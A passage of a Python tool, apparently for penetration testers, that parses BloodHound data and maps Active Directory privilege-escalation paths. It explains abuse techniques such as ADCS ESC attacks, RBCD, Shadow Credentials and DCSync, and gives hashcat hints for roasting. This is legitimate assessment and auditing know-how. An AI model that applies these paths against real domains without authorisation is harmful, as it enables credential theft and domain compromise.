#!/usr/bin/env python3
"""
bernese - BloodHound attack-path explorer

An interactive terminal tool for triaging BloodHound CE / RustHound-CE data and
piecing together Active Directory privilege-escalation paths that the BloodHound
GUI doesn't surface on its own.

Run it with just `-d <data>` to drop into the interactive app (pick a start node,
browse the attack tree, escalation routes, rights, etc.). The app is a full-screen
TUI and needs the `textual` + `rich` packages; without them bernese prints how to
install them and exits. The subcommands below always work for one-off / scripted
use with zero third-party packages.

    summary                            domain overview
    users / groups / computers         inventory with the interesting flags
    members <group>                    recursive group membership
    das                                domain/enterprise admins & admin-equivalent groups
    kerberoastable / asreproastable    roastable accounts
    rights <RIGHT>                     everyone holding GenericAll/GenericWrite/...
    control <principal>                what a principal can take over (outbound)
    controllers <principal>            who can take over a principal (inbound)
    dcsync / delegation / spns / adcs  focused checks
    paths --from X [--to Y]            attack paths (to a target, or any high-value)
    escalate --from X                  everything reachable from X

Python 3.8+. The CLI subcommands are stdlib-only; the TUI additionally needs
`pip install textual rich`.
"""

import argparse
import codecs
import contextlib
import io
import json
import os
import re
import sys
import zipfile
from collections import defaultdict, deque

__version__ = "1.3"

# --------------------------------------------------------------------------- #
# Colour
# --------------------------------------------------------------------------- #
class C:
    enabled = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
    @classmethod
    def w(cls, s, code):
        return f"\033[{code}m{s}\033[0m" if cls.enabled else str(s)

def red(s):    return C.w(s, "31")
def green(s):  return C.w(s, "32")
def yellow(s): return C.w(s, "33")
def blue(s):   return C.w(s, "94")   # bright blue — dark blue (34) is unreadable on dark bg
def mag(s):    return C.w(s, "35")
def cyan(s):   return C.w(s, "36")
def bold(s):   return C.w(s, "1")
def dim(s):    return C.w(s, "2")

# --- consistent key-chip + navigation-bar styling, used for every prompt ---- #
def _optref(n):
    """A loud pointer to a menu option, so cross-references don't vanish in dim text."""
    return C.w(f" ▶ option {n} ", "1;30;106")

def header(s):
    print()
    print(bold(cyan(s)))
    print(cyan("-" * len(s)))

# --------------------------------------------------------------------------- #
# Well-known high-value principals
# --------------------------------------------------------------------------- #
HIGHVALUE_RIDS = {
    "512": "Domain Admins", "516": "Domain Controllers", "518": "Schema Admins",
    "519": "Enterprise Admins",
    "521": "Read-only Domain Controllers", "526": "Key Admins",
    "527": "Enterprise Key Admins", "502": "krbtgt",
}
# NB: RID 520 (Group Policy Creator Owners) is deliberately NOT high-value — membership
# only lets you CREATE new GPOs, not link them to an OU/domain, so it is a privesc path
# only when paired with a separate WriteGPLink right (which that membership does not grant).
# Builtin groups are keyed by the S-1-5-32-RID suffix because collectors prefix
# them with the domain (e.g. "DOMAIN.LOCAL-S-1-5-32-544").
HIGHVALUE_BUILTIN = {
    "544": "Administrators", "548": "Account Operators", "549": "Server Operators",
    "550": "Print Operators", "551": "Backup Operators", "552": "Replicators",
}
# Well-known SIDs so bare-SID holders (e.g. DCSync) still read as something.
WELLKNOWN_SIDS = {
    "S-1-5-9": "Enterprise Domain Controllers",
    "S-1-5-11": "Authenticated Users",
    "S-1-5-32-544": "Administrators (builtin)",
    "S-1-5-32-548": "Account Operators (builtin)",
    "S-1-5-32-549": "Server Operators (builtin)",
    "S-1-5-32-550": "Print Operators (builtin)",
    "S-1-5-32-551": "Backup Operators (builtin)",
    "S-1-1-0": "Everyone",
    "S-1-5-18": "SYSTEM (Local System)",
}

def _sid_hint(sid):
    """Human label for a SID that isn't a resolved node (well-known / by RID)."""
    s = str(sid)
    if s in WELLKNOWN_SIDS:
        return WELLKNOWN_SIDS[s]
    for wk, name in WELLKNOWN_SIDS.items():
        if s.endswith(wk):           # collectors domain-prefix builtin SIDs
            return name
    rid = s.rsplit("-", 1)[-1]
    if rid in HIGHVALUE_RIDS:
        return HIGHVALUE_RIDS[rid]
    if "S-1-5-32-" in s:
        return HIGHVALUE_BUILTIN.get(s.split("S-1-5-32-")[-1], None)
    return None

CONTROL_RIGHTS = {
    "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "Owner",
    "WriteAccountRestrictions", "ForceChangePassword", "AllExtendedRights",
    "AddMember", "AddSelf", "AddKeyCredentialLink", "AddAllowedToAct",
    "WriteSPN", "ReadLAPSPassword", "ReadGMSAPassword", "ManageCA",
    "ManageCertificates", "WriteGPLink", "WritePKIEnrollmentFlag",
    "WritePKINameFlag", "Enroll",
}
REPL_RIGHTS = {"GetChanges", "GetChangesAll", "GetChangesInFilteredSet", "DCSync"}
# template ESCs where simply enrolling gets you a cert you can auth with as a DA
ENROLL_ESCS = ("ESC1", "ESC2", "ESC3", "ESC9", "ESC15")
# ESCs that let the enroller get a certificate as an arbitrary user (SAN / enrollment agent /
# template rewrite) → edges straight to the admin accounts. ESC9 needs write on a victim's UPN
# first, ESC8 / ESC13 grant something else, so they stay domain / group edges only.
IMPERSONATE_ESCS = ("ESC1", "ESC2", "ESC3", "ESC4", "ESC15")

def technique(right, target_kind, target_name):
    k = (target_kind or "").lower()
    tn = bold(target_name)
    esc = {
        "ESC1": f"ESC1: enroll a cert with an arbitrary SAN -> authenticate as any user (DA) -> {tn}",
        "ESC2": f"ESC2: enroll an Any-Purpose cert -> impersonate any user -> {tn}",
        "ESC3": f"ESC3: get an Enrollment Agent cert, then enroll on behalf of a DA -> {tn}",
        "ESC4": f"ESC4: rewrite the template to be ESC1, then enroll as a DA -> {tn}",
        "ESC9": f"ESC9: no-security-extension cert + weak mapping -> impersonate a DA -> {tn}",
        "ESC8": f"ESC8: coerce a DC (PetitPotam/PrinterBug) and relay to CA web enrollment -> DC cert -> DCSync {tn}",
        "ESC13": f"ESC13: enroll a cert whose issuance policy is linked to {tn} -> auth with it and act as a member",
        "ESC15": f"ESC15 (EKUwu): schema-v1 template + supplied subject -> inject Client Auth policy -> impersonate a DA -> {tn}",
    }
    if right in esc:
        return esc[right]
    if right == "HasSession":
        return f"{tn} is logged on here -> dump their creds/tickets (needs admin/SYSTEM on this host)"
    if right == "CanRDP":
        return f"RDP into {tn} (shell as you; local privesc for SYSTEM)"
    if right == "CanPSRemote":
        return f"WinRM/PSRemote into {tn} (evil-winrm; local privesc for SYSTEM)"
    if right == "ExecuteDCOM":
        return f"Execute code on {tn} over DCOM (dcomexec.py) as you"
    if right == "SQLAdmin":
        return f"sysadmin on {tn}'s MSSQL -> xp_cmdshell as the service account"
    if right == "HasSIDHistory":
        return f"Your sIDHistory carries {tn}'s SID -> you hold its rights"
    if right == "SpoofSIDHistory":
        return f"Golden ticket with ExtraSids (Enterprise Admins / RID 519) across the trust -> {tn}"
    if right == "MemberOf":
        return f"Member of {tn} - inherit all of its privileges (free)"
    if right == "GPOAbuse":
        return f"Edit the GPO's policy -> code execution as SYSTEM on {tn}"
    if right == "AdminTo":
        return f"Local administrator on {tn}"
    if right in ("AllowedToAct", "AddAllowedToAct"):
        return f"RBCD: configure delegation and compromise {tn} (S4U2Self/Proxy)"
    if right == "ForceChangePassword":
        return f"Reset {tn}'s password, then authenticate as them"
    if right in ("AddMember", "AddSelf"):
        return f"Add yourself to {tn}"
    if right == "AddKeyCredentialLink":
        return f"Shadow Credentials: add a key credential and auth as {tn}"
    if right in ("WriteOwner", "Owns", "Owner"):
        return f"Set yourself as owner of {tn}, then WriteDacl -> full control"
    if right == "WriteDacl":
        return f"Grant yourself GenericAll over {tn}"
    if right == "ReadGMSAPassword":
        return f"Read the gMSA managed password of {tn}"
    if right == "ReadLAPSPassword":
        return f"Read the LAPS local-admin password on {tn}"
    if right == "WriteSPN":
        return f"Write an SPN on {tn} -> targeted Kerberoast"
    if right in ("GenericAll", "GenericWrite", "AllExtendedRights", "WriteAccountRestrictions"):
        if "group" in k:
            return f"Add yourself to {tn}"
        if "computer" in k:
            return f"RBCD or Shadow Credentials -> SYSTEM on {tn}"
        if "user" in k:
            if right == "AllExtendedRights":
                return f"ForceChangePassword / read secrets of {tn}"
            if right == "GenericWrite":
                return f"Targeted Kerberoast (write SPN) or Shadow Credentials on {tn}"
            return f"Shadow Credentials / targeted Kerberoast / password reset on {tn}"
        if "domain" in k:
            return f"Full control of domain {tn} (consider DCSync grant)"
        if "gpo" in k:
            return f"Edit GPO {tn} -> code execution on every linked computer"
        return f"Full control of {tn}"
    return f"{right} over {tn}"

# --------------------------------------------------------------------------- #
# Node model
# --------------------------------------------------------------------------- #
class Node:
    __slots__ = ("sid", "kind", "name", "props", "aces", "members",
                 "spntargets", "allowed_to_act", "allowed_to_delegate",
                 "admins", "primary_group", "sessions")
    def __init__(self, sid, kind="Base"):
        self.sid = sid
        self.kind = kind
        self.name = sid
        self.props = {}
        self.aces = []
        self.members = []
        self.spntargets = []
        self.allowed_to_act = []
        self.allowed_to_delegate = []
        self.admins = []
        self.primary_group = None
        self.sessions = []            # computers: SIDs of users with a session

    def p(self, key, default=None):
        return self.props.get(key, default)

# --------------------------------------------------------------------------- #
# Graph
# --------------------------------------------------------------------------- #
class Graph:
    def __init__(self):
        self.nodes = {}
        self.by_name = {}
        self.ctrl = defaultdict(list)
        self.rctrl = defaultdict(list)
        self.domain_sids = []
        self.domain_name = None
        self.templates = []
        self.cas = []
        self.esc_branches = []
        self.container_children = {}           # domain/OU/container sid -> [child sids]
        self.container_links = {}              # container sid -> [GPO GUIDs (upper)]
        self.gpo_by_guid = {}                  # GPO GUID (upper) -> node sid
        self.gpo_affects = {}                  # GPO sid -> set of computer sids
        self.maq = None                        # ms-DS-MachineAccountQuota (domain)
        self.local_rights = []                 # (principal, computer, CanRDP/CanPSRemote/ExecuteDCOM)
        self.sidhistory = []                   # (principal, SID it carries in sIDHistory)
        self.trusts = []                       # dicts from _mk_trust
        self.oid_group = {}                    # issuance-policy OID -> linked group SID (ESC13)
        self.forest_root = None                # forest-root domain SID (ForestRootIdentifier)
        self.sources = []                      # basename(s) of the collection(s) loaded
        self.collectors = set()                # meta.collectorversion strings seen
        self.unmodeled = defaultdict(int)      # ACE right name -> count (not turned into edges)
        self.dq = {}                           # data_quality() result

    def node(self, sid):
        n = self.nodes.get(sid)
        if n is None:
            n = Node(sid)
            self.nodes[sid] = n
        return n

    def resolve(self, token):
        if not token:
            return None
        if token in self.nodes:
            return token
        t = token.upper()
        if t in self.by_name:
            return self.by_name[t]
        if self.domain_name and "@" not in t and "." not in t:
            cand = f"{t}@{self.domain_name.upper()}"
            if cand in self.by_name:
                return self.by_name[cand]
        hits = [sid for nm, sid in self.by_name.items() if t == nm.split("@")[0]]
        if len(hits) == 1:
            return hits[0]
        hits = sorted(set(sid for nm, sid in self.by_name.items() if t in nm))
        if len(hits) == 1:
            return hits[0]
        if len(hits) > 1:
            print(red(f"[!] '{token}' is ambiguous:"))
            for h in hits[:15]:
                print("    " + self.label(h))
            return None
        return None

    def label(self, sid):
        n = self.nodes.get(sid)
        if not n:
            hint = _sid_hint(sid)
            if hint:
                return f"{yellow(hint)} {dim('(' + str(sid) + ')')}"
            return dim(sid)
        kcol = {"User": green, "Group": yellow, "Computer": blue,
                "Domain": mag, "GPO": cyan, "OU": dim, "Container": dim}
        col = kcol.get(n.kind, lambda s: s)
        return f"{col(n.name)} {dim('(' + n.kind + ')')}"

    def is_highvalue(self, sid):
        n = self.nodes.get(sid)
        if not n:
            # The object wasn't collected (foreign/filtered), but a well-known high-value
            # RID is high-value regardless — flag Domain Admins / Enterprise Admins / etc.
            # even as a bare SID instead of letting it render as a plain grey principal.
            s = str(sid)
            if "S-1-5-32-" in s:
                brid = s.split("S-1-5-32-")[-1]
                if brid in HIGHVALUE_BUILTIN:
                    return HIGHVALUE_BUILTIN[brid]
            rid = s.rsplit("-", 1)[-1]
            if rid in HIGHVALUE_RIDS:
                return HIGHVALUE_RIDS[rid]
            return None
        if "S-1-5-32-" in sid:
            brid = sid.split("S-1-5-32-")[-1]
            if brid in HIGHVALUE_BUILTIN:
                return HIGHVALUE_BUILTIN[brid]
        rid = sid.rsplit("-", 1)[-1]
        if rid in HIGHVALUE_RIDS and n.kind in ("Group", "User"):
            return HIGHVALUE_RIDS[rid]
        if n.kind == "Domain":
            return "Domain compromise"
        if n.kind == "Computer" and _is_dc(self, sid):
            return "Domain Controller"
        if n.kind == "Group" and n.p("admincount"):
            return "admincount group"
        return None

    def add_edge(self, src, dst, label):
        if not src or not dst or src == dst:
            return
        self.ctrl[src].append((dst, label))
        self.rctrl[dst].append((src, label))

    def build_edges(self):
        for sid, n in self.nodes.items():
            # group membership (primary-group members were folded into n.members)
            for m in n.members:
                self.add_edge(m, sid, "MemberOf")
            repl_by = defaultdict(set)
            for (psid, right, _inh) in n.aces:
                if right in CONTROL_RIGHTS:
                    self.add_edge(psid, sid, right)
                elif right in REPL_RIGHTS:
                    repl_by[psid].add(right)
                else:
                    self.unmodeled[right] += 1
            if n.kind == "Domain":
                for psid, rights in repl_by.items():
                    if ("GetChanges" in rights and "GetChangesAll" in rights) or "DCSync" in rights:
                        self.add_edge(psid, sid, "DCSync")
            for a in n.admins:
                self.add_edge(a, sid, "AdminTo")
            for a in n.allowed_to_act:
                self.add_edge(a, sid, "AllowedToAct")
            for u in n.sessions:
                self.add_edge(sid, u, "HasSession")
            for c in n.spntargets:
                self.add_edge(sid, c, "SQLAdmin")
        for (p, c, lbl) in self.local_rights:
            self.add_edge(p, c, lbl)
        for (p, h) in self.sidhistory:
            self.add_edge(p, h, "HasSIDHistory")
        for tr in self.trusts:
            dn = self.node(tr["dst"])
            if dn.kind == "Base":
                dn.kind = "Domain"
                dn.name = tr["name"]
                dn.props = {"name": tr["name"], "foreign": True}
                self.by_name.setdefault(tr["name"], tr["dst"])
            we_reach, they_reach = _trust_abuse(tr)
            if we_reach:
                self.add_edge(tr["src"], tr["dst"], "SpoofSIDHistory")
            if they_reach:
                self.add_edge(tr["dst"], tr["src"], "SpoofSIDHistory")

    def bfs_path(self, src, dst):
        if src == dst:
            return [(src, None)]
        prev = {src: None}
        q = deque([src])
        while q:
            cur = q.popleft()
            for (nxt, lbl) in self.ctrl.get(cur, []):
                if nxt not in prev:
                    prev[nxt] = (cur, lbl)
                    if nxt == dst:
                        return self._reconstruct(prev, src, dst)
                    q.append(nxt)
        return None

    def _reconstruct(self, prev, src, dst):
        path = []
        cur = dst
        while cur != src:
            parent, lbl = prev[cur]
            path.append((cur, lbl))
            cur = parent
        path.append((src, None))
        path.reverse()
        return path

    def reachable(self, src):
        seen = {src: (0, None)}
        q = deque([src])
        while q:
            cur = q.popleft()
            d = seen[cur][0]
            for (nxt, lbl) in self.ctrl.get(cur, []):
                if nxt not in seen:
                    seen[nxt] = (d + 1, lbl)
                    q.append(nxt)
        return seen

    def reach_from(self, sources):
        """One BFS from a SET of sources at once. Returns {sid: (dist, origin, parent, lbl)}:
        hops from the nearest source, which source that is, and the back-pointer."""
        seen = {s: (0, s, None, None) for s in sources}
        q = deque(seen)
        while q:
            cur = q.popleft()
            d, origin = seen[cur][0], seen[cur][1]
            for (nxt, lbl) in self.ctrl.get(cur, []):
                if nxt not in seen:
                    seen[nxt] = (d + 1, origin, cur, lbl)
                    q.append(nxt)
        return seen

    @staticmethod
    def path_in(reach, dst):
        """The [(sid, lbl)] chain origin -> dst out of a `reach_from` result (or None)."""
        if dst not in reach:
            return None
        path, cur = [], dst
        while cur is not None:
            _d, _o, parent, lbl = reach[cur]
            path.append((cur, lbl))
            cur = parent
        path.reverse()
        return path

    def reached_by(self, dst):
        """Reverse BFS: {sid: hops to dst} for every principal that can reach dst."""
        seen = {dst: 0}
        q = deque([dst])
        while q:
            cur = q.popleft()
            for (src, _lbl) in self.rctrl.get(cur, []):
                if src not in seen:
                    seen[src] = seen[cur] + 1
                    q.append(src)
        return seen

# --------------------------------------------------------------------------- #
# Loader
# --------------------------------------------------------------------------- #
FILE_KIND = {"users": "User", "groups": "Group", "computers": "Computer",
             "domains": "Domain", "gpos": "GPO", "ous": "OU",
             "containers": "Container", "certtemplates": "CertTemplate",
             "enterprisecas": "EnterpriseCA", "rootcas": "RootCA",
             "ntauthstores": "NTAuthStore", "issuancepolicies": "IssuancePolicy",
             "aiacas": "AIACA"}

def _loads_bytes(raw):
    """Parse JSON from raw bytes, decoding defensively.

    Some collectors (and some Python builds' json auto-detection) trip over
    BOMs, genuine UTF-16 output, or a stray leading NUL byte. Decode ourselves
    with explicit fallbacks instead of trusting json.load's encoding guess.
    """
    for bom, enc in ((codecs.BOM_UTF32_LE, "utf-32-le"),
                     (codecs.BOM_UTF32_BE, "utf-32-be"),
                     (codecs.BOM_UTF8, "utf-8-sig"),
                     (codecs.BOM_UTF16_LE, "utf-16-le"),
                     (codecs.BOM_UTF16_BE, "utf-16-be")):
        if raw.startswith(bom):
            return json.loads(raw.decode(enc).lstrip("﻿"))
    nul = raw.count(b"\x00")
    if nul == 0:
        return json.loads(raw.decode("utf-8"))
    # Interleaved NULs => real UTF-16 without a BOM; guess endianness.
    if nul > len(raw) // 4:
        le = raw[1::2].count(0)
        be = raw[0::2].count(0)
        order = ("utf-16-le", "utf-16-be") if le >= be else ("utf-16-be", "utf-16-le")
        for enc in order:
            try:
                return json.loads(raw.decode(enc).lstrip("﻿"))
            except (UnicodeDecodeError, ValueError):
                continue
        return json.loads(raw.decode(order[0], errors="replace").lstrip("﻿"))
    # Sparse NULs (e.g. a stray leading/trailing NUL on UTF-8 text) => drop them.
    return json.loads(raw.replace(b"\x00", b"").decode("utf-8", errors="replace"))

def _is_json_member(name):
    """A real .json data file, not a directory or macOS/editor junk."""
    if name.endswith("/"):
        return False
    base = os.path.basename(name)
    # Skip macOS AppleDouble resource forks (__MACOSX/._foo.json, ._foo.json).
    if name.startswith("__MACOSX/") or base.startswith("._"):
        return False
    return base.lower().endswith(".json")

def _iter_json(path):
    if os.path.isdir(path):
        for fn in sorted(os.listdir(path)):
            if _is_json_member(fn):
                with open(os.path.join(path, fn), "rb") as f:
                    yield fn, _loads_bytes(f.read())
    elif zipfile.is_zipfile(path):
        with zipfile.ZipFile(path) as z:
            for name in z.namelist():
                if _is_json_member(name):
                    with z.open(name) as f:
                        yield name, _loads_bytes(f.read())
    elif path.lower().endswith(".json"):
        with open(path, "rb") as f:
            yield os.path.basename(path), _loads_bytes(f.read())
    elif not os.path.exists(path):
        raise SystemExit(red(f"[!] No such file or directory: {path}  "
                             f"(cwd: {os.getcwd()})"))
    else:
        raise SystemExit(red(f"[!] Don't know how to read: {path}  "
                             "(expected a .zip, a .json, or a directory of .json files)"))

def _kind_from(meta_type, filename):
    if meta_type and meta_type in FILE_KIND:
        return FILE_KIND[meta_type]
    for key, kind in FILE_KIND.items():
        if key in filename.lower():
            return kind
    return "Base"

def _get(d, *keys, default=None):
    low = {k.lower(): v for k, v in d.items()}
    for k in keys:
        if k.lower() in low:
            return low[k.lower()]
    return default

# --- ADCS helpers ---------------------------------------------------------- #
EKU_NAMES = {
    "1.3.6.1.5.5.7.3.2": "Client Authentication",
    "1.3.6.1.5.5.7.3.1": "Server Authentication",
    "1.3.6.1.4.1.311.20.2.2": "Smart Card Logon",
    "1.3.6.1.5.2.3.4": "PKINIT Client Authentication",
    "1.3.6.1.5.2.3.5": "KDC Authentication",
    "1.3.6.1.4.1.311.20.2.1": "Certificate Request Agent",
    "2.5.29.37.0": "Any Purpose",
    "1.3.6.1.4.1.311.10.3.4": "EFS",
    "1.3.6.1.5.5.7.3.4": "Secure Email",
    "1.3.6.1.4.1.311.10.3.1": "Microsoft Trust List Signing",
    "1.3.6.1.5.5.7.3.3": "Code Signing",
}
AUTH_EKUS = {"1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2",
             "1.3.6.1.5.2.3.4", "2.5.29.37.0"}
ANY_PURPOSE = "2.5.29.37.0"
REQUEST_AGENT_EKU = "1.3.6.1.4.1.311.20.2.1"
TEMPLATE_WRITE = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner",
                  "Owns", "Owner", "WritePKIEnrollmentFlag", "WritePKINameFlag"}

def _mk_template(obj):
    p = {str(k).lower(): v for k, v in (_get(obj, "Properties", default={}) or {}).items()}
    aces = []
    for a in _get(obj, "Aces", default=[]) or []:
        psid = _get(a, "PrincipalSID", "PrincipalSid")
        right = _get(a, "RightName", "Right")
        if psid and right:
            aces.append((str(psid), str(right)))
    return {"name": p.get("name", "?"), "guid": p.get("objectguid"),
            "props": p, "aces": aces}

def _mk_ca(obj):
    p = {str(k).lower(): v for k, v in (_get(obj, "Properties", default={}) or {}).items()}
    aces = []
    for a in _get(obj, "Aces", default=[]) or []:
        psid = _get(a, "PrincipalSID", "PrincipalSid")
        right = _get(a, "RightName", "Right")
        if psid and right:
            aces.append((str(psid), str(right)))
    crd = _get(obj, "CARegistryData", default={}) or {}
    casec = []
    cs = crd.get("CASecurity") if isinstance(crd, dict) else None
    if isinstance(cs, dict):
        cs = cs.get("Data", cs)
    for a in (cs or []):
        if isinstance(a, dict):
            psid = _get(a, "PrincipalSID", "PrincipalSid")
            right = _get(a, "RightName", "Right")
            if psid and right:
                casec.append((str(psid), str(right)))
    http, http_vuln = [], []
    for e in _get(obj, "HttpEnrollmentEndpoints", default=[]) or []:
        r = e.get("Result") if isinstance(e, dict) else e
        if not r:
            continue
        if isinstance(r, str):
            http.append(r)
            if r.lower().startswith("http://"):
                http_vuln.append(r)
        elif isinstance(r, dict):                       # {Url, Status, ADCSWebEnrollment*}
            url = (r.get("url") or r.get("Url") or r.get("URL")
                   or r.get("ADCSWebEnrollmentHTTP") or r.get("ADCSWebEnrollmentHTTPS"))
            url = str(url) if isinstance(url, str) else str(r)
            http.append(url)
            status = str(r.get("Status") or r.get("status") or "").lower().replace("_", "")
            if status:
                vuln = "vulnerable" in status and "notvulnerable" not in status
            else:
                vuln = (r.get("ADCSWebEnrollmentHTTP") is True
                        or url.lower().startswith("http://"))
            if vuln:
                http_vuln.append(url)
        elif isinstance(r, list):
            http.extend(str(x) for x in r if x)
        else:
            http.append(str(r))
    san = crd.get("IsUserSpecifiesSanEnabled") if isinstance(crd, dict) else None
    if isinstance(san, dict):
        san = san.get("Value") if san.get("Collected") else None
    return {"name": p.get("name", "?"), "props": p, "aces": aces + casec,
            "casecurity": casec, "user_san": san, "http": http, "http_vuln": http_vuln}

LOCAL_GROUP_EDGE = {"544": "AdminTo", "555": "CanRDP", "562": "ExecuteDCOM",
                    "580": "CanPSRemote"}
_LEGACY_LOCAL_FIELDS = (("LocalAdmins", "AdminTo"), ("RemoteDesktopUsers", "CanRDP"),
                        ("DcomUsers", "ExecuteDCOM"), ("PSRemoteUsers", "CanPSRemote"))
_TRUST_DIR = {"0": "Disabled", "1": "Inbound", "2": "Outbound", "3": "Bidirectional"}
_TRUST_TYPE = {"0": "ParentChild", "1": "CrossLink", "2": "Forest", "3": "External",
               "4": "Unknown"}
_INTRA_FOREST = {"ParentChild", "CrossLink", "TreeRoot"}

def _result_sids(v):
    """SIDs out of a SharpHound {Results:[{ObjectIdentifier}]} block (or a bare list)."""
    if isinstance(v, dict):
        v = v.get("Results", []) or []
    out = []
    for r in (v or []):
        s = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
        if s:
            out.append(str(s))
    return out

def _add_local_right(g, n, principal, lbl):
    if lbl == "AdminTo":
        if principal not in n.admins:
            n.admins.append(principal)
    else:
        g.local_rights.append((principal, n.sid, lbl))

def _mk_trust(src_sid, tr):
    d = str(_get(tr, "TrustDirection", default=""))
    t = str(_get(tr, "TrustType", default=""))
    sidf = _get(tr, "SidFilteringEnabled", default=None)
    return {"src": src_sid,
            "dst": str(_get(tr, "TargetDomainSid", "TargetDomainSID")),
            "name": str(_get(tr, "TargetDomainName", default="") or "?").upper(),
            "dir": _TRUST_DIR.get(d, d or "Unknown"),
            "type": _TRUST_TYPE.get(t, t or "Unknown"),
            "transitive": _get(tr, "IsTransitive", default=None),
            "sidfilter": None if sidf is None else _truthy(sidf)}

def _trust_abuse(tr):
    """(we_reach_them, they_reach_us) for a trust as seen from the collected domain.

    Inbound  = the other domain trusts us  -> our principals can authenticate there.
    Outbound = we trust the other domain   -> their principals can authenticate here.
    A domain compromise crosses the trust (ExtraSids / SID-history golden ticket) when
    the trusting side does not filter SIDs. Inside a forest that filter never applies;
    across forests we only know our own side's quarantine setting."""
    intra = tr["type"] in _INTRA_FOREST
    them_trust_us = tr["dir"] in ("Inbound", "Bidirectional")
    we_trust_them = tr["dir"] in ("Outbound", "Bidirectional")
    we_reach_them = them_trust_us and intra
    they_reach_us = we_trust_them and (intra or tr["sidfilter"] is False)
    return we_reach_them, they_reach_us

def _ekus(tmpl):
    e = tmpl["props"].get("effectiveekus") or tmpl["props"].get("ekus") or []
    return [str(x) for x in e] if isinstance(e, list) else []

def _truthy(v):
    return v is True or str(v).lower() in ("true", "1", "yes")

def _is_admin(g, sid):
    if g.is_highvalue(sid):
        return True
    rid = sid.rsplit("-", 1)[-1]
    if rid in ("500", "512", "519", "518", "516", "502"):   # not 520 (GPCO — create-only)
        return True
    n = g.nodes.get(sid)
    if n and n.p("admincount"):
        return True
    return False

# --- classification helpers ------------------------------------------------ #
def _direct_groups(g, sid):
    """SIDs of groups this principal is directly a member of."""
    return [dst for (dst, lbl) in g.ctrl.get(sid, []) if lbl == "MemberOf"]

def _principal_closure(g, sid):
    """A principal plus every group it belongs to (transitively) — i.e. the set
    whose ACL rights it effectively wields."""
    seen = {sid}
    q = deque([sid])
    while q:
        cur = q.popleft()
        for (dst, lbl) in g.ctrl.get(cur, []):
            if lbl == "MemberOf" and dst not in seen:
                seen.add(dst)
                q.append(dst)
    return seen

def _owned_rights(g, owned):
    """Set of right-labels the owned set effectively holds (direct or via groups)."""
    rights = set()
    for o in owned:
        for c in _principal_closure(g, o):
            for (_dst, lbl) in g.ctrl.get(c, []):
                if lbl != "MemberOf":
                    rights.add(lbl)
    return rights

def _is_dc(g, sid):
    """Is this computer a (writable/read-only) domain controller?"""
    n = g.nodes.get(sid)
    if not n or n.kind != "Computer":
        return False
    if n.primary_group and n.primary_group.rsplit("-", 1)[-1] in ("516", "521"):
        return True
    for d in _direct_groups(g, sid):
        if d.rsplit("-", 1)[-1] in ("516", "521"):
            return True
    return False

def _is_default_unconstrained(g, sid):
    """DCs hold unconstrained delegation by design — not a finding."""
    return _is_dc(g, sid)

def _is_default_dcsync(g, psid):
    """Replication rights are expected for DA's/EA's/Administrators/DCs."""
    if _is_admin(g, psid) or _is_dc(g, psid):
        return True
    # S-1-5-9 = Enterprise Domain Controllers
    return psid.endswith("S-1-5-9") or "-S-1-5-9" in psid

def _user_profile(g, sid):
    """(tree_size, [high-value sids reached], best (hv_name, hops, edge_label) or None)."""
    reach = g.reachable(sid)
    size = len(reach) - 1
    hv = [s for s in reach if s != sid and g.is_highvalue(s)]
    best = None
    if hv:
        b = min(hv, key=lambda s: reach[s][0])
        best = (g.is_highvalue(b), reach[b][0], reach[b][1])
    return size, hv, best

def _control_counts(g, sid):
    """(groups, rights, targets, reach): groups the principal is in (transitively), the
    control edges it holds directly or through those groups, how many distinct objects
    those cover, and everything reachable by chaining memberships and control edges."""
    closure = _principal_closure(g, sid)
    groups = sum(1 for c in closure if c != sid)
    rights, targets = 0, set()
    for c in closure:
        for (dst, lbl) in g.ctrl.get(c, []):
            if lbl != "MemberOf":
                rights += 1
                targets.add(dst)
    return groups, rights, len(targets), len(g.reachable(sid)) - 1

def _group_names(g, sid, limit=3):
    """Readable names of the non-default groups a user belongs to."""
    names = []
    for d in _direct_groups(g, sid):
        n = g.nodes.get(d)
        if not n:
            continue
        rid = d.rsplit("-", 1)[-1]
        if rid in ("513", "515"):          # Domain Users / Domain Computers (noise)
            continue
        names.append(n.name.split("@")[0])
    return names[:limit]

# --- Kerberos encryption types (msDS-SupportedEncryptionTypes) -------------- #
_ENC_BITS = [(0x1, "DES"), (0x2, "DES"), (0x4, "RC4"),
             (0x8, "AES"), (0x10, "AES")]

def _enc_types(n):
    """Set of {'RC4','AES','DES'} the account advertises; empty = attribute unset."""
    v = n.p("supportedencryptiontypes")
    cats = set()
    if v in (None, "", [], 0, "0"):
        return cats
    items = v if isinstance(v, list) else [v]
    for it in items:
        s = str(it).strip().upper()
        if s.isdigit():
            bits = int(s)
            for bit, name in _ENC_BITS:
                if bits & bit:
                    cats.add(name)
        elif "RC4" in s:
            cats.add("RC4")
        elif "AES" in s:
            cats.add("AES")
        elif "DES" in s:
            cats.add("DES")
    return cats

def _roast_enc_tag(n):
    """(short colored label, hashcat hint) describing how a roast comes back.

    Only claim RC4 when the account EXPLICITLY advertises it. An unset/0
    msDS-SupportedEncryptionTypes is NOT a guarantee of RC4 — a hardened DC may
    refuse RC4 and hand back AES (or KDC_ERR_ETYPE_NOSUPP), so it's reported as
    'etype?' rather than a false 'RC4'."""
    cats = _enc_types(n)
    hint_prefix = "crack by the $krb5tgs$<etype>$ prefix: RC4=13100, AES128=19600, AES256=19700"
    if not cats:
        return yellow("enc?"), ("supportedEncryptionTypes unset, so the etype is unknown until you ask — "
                                "the DC picks at request time (modern DCs lean AES, older/compat RC4); " + hint_prefix)
    if "RC4" in cats and "AES" in cats:
        return green("RC4+AES"), ("RC4 available → hashcat -m 13100 (or AES 19600/19700)")
    if "RC4" in cats:
        return green("RC4"), "fast — hashcat -m 13100 (TGS) / -m 18200 (AS-REP)"
    if "AES" in cats:
        return yellow("AES only"), ("slow — hashcat -m 19600/19700; an RC4 request will be"
                                    " refused (KDC_ERR_ETYPE_NOSUPP) — request AES / update impacket")
    return dim("DES"), "legacy DES"

# --- privileged-account / LAPS / MAQ classification ------------------------- #
def _da_member_set(g):
    """SIDs that are members (recursive) of Domain/Enterprise/Schema Admins etc."""
    out = set()
    for sid, n in g.nodes.items():
        if n.kind == "Group" and sid.rsplit("-", 1)[-1] in ("512", "519", "518", "516"):
            for m in _expand_members(g, sid):
                out.add(m)
    return out

def _priv_set(g):
